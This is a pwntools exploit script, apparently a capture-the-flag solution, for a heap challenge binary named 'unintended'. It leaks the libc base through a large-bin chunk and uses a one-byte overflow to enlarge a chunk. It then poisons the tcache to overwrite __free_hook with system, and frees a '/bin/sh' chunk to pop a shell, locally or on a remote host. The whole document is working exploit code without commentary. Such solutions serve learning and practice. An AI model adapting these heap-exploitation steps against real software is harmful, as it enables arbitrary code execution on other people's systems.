from pwn import *
def alloc(idx, category, name, description, length=None, points=0):
    p.sendlineafter("> ", "1")
    p.sendlineafter(": ", str(idx))
    p.sendafter(": ", category)
    p.sendafter(": ", name)
    p.sendlineafter(": ", str(length if length else len(description)))
    p.sendafter(": ", description)
    p.sendlineafter(": ", str(points))
def patch(idx, description):
    p.sendlineafter("> ", "2")
    p.sendlineafter(": ", str(idx))
    p.sendafter(": ", description)
def deploy(idx):
    ans = []
    p.sendlineafter("> ", "3")
    p.sendlineafter(": ", str(idx))
    p.recvuntil("Category: ")
    ans.append(p.recvline()[:-1])
    p.recvuntil("Name: ")
    ans.append(p.recvline()[:-1])
    p.recvuntil("Description: ")
    ans.append(p.recvline()[:-1])
    return ans
def takedown(idx):
    p.sendlineafter("> ", "4")
    p.sendlineafter(": ", str(idx))
e = ELF("./src/unintended")
libc = ELF("./src/lib/libc.so.6")
p = e.process() if not args.REMOTE else remote(args.HOST, int(args.PORT))
# Use large bin to leak libc, then get rid of all of the evidence
alloc(0, b"A", b"A", b"A", 0x1000)
alloc(1, b"A", b"A", b"A", 0x1000)
takedown(0)
alloc(0, b"A", b"A", b"A", 0x1000)
leak = u64(deploy(0)[2].ljust(8, b"\x00"))
log.info(f"Libc leak: {hex(leak)}")
libc.address = leak - 0x3ebc41
log.info(f"Libc base: {hex(libc.address)}")
takedown(1)
takedown(0)

# Set up for free hook
alloc(9, b"A", b"A", b"/bin/sh")
# Manouevre heap then make chunk bigger than it is
alloc(0, b"A", b"A", b"A", 0x30)
takedown(0)
alloc(0, b"web", b"trigger", b"A"*24)
alloc(1, b"pwn", b"edited", b"B"*32)
patch(0, b"A"*24 + b"\xf1")
takedown(1)
alloc(2, b"B", b"B", b"B", 0x40)
takedown(2)
# Use bigger chunk to tcache poison
payload = b'A'*40 + p64(0x51) + p64(libc.symbols['__free_hook'])
alloc(3, b"C", b"C", payload, 0xe0)
alloc(4, b"D", b"D", b"D", 0x40)
alloc(5, b"D", b"D", p64(libc.symbols['system']), 0x40)
takedown(9)
p.interactive()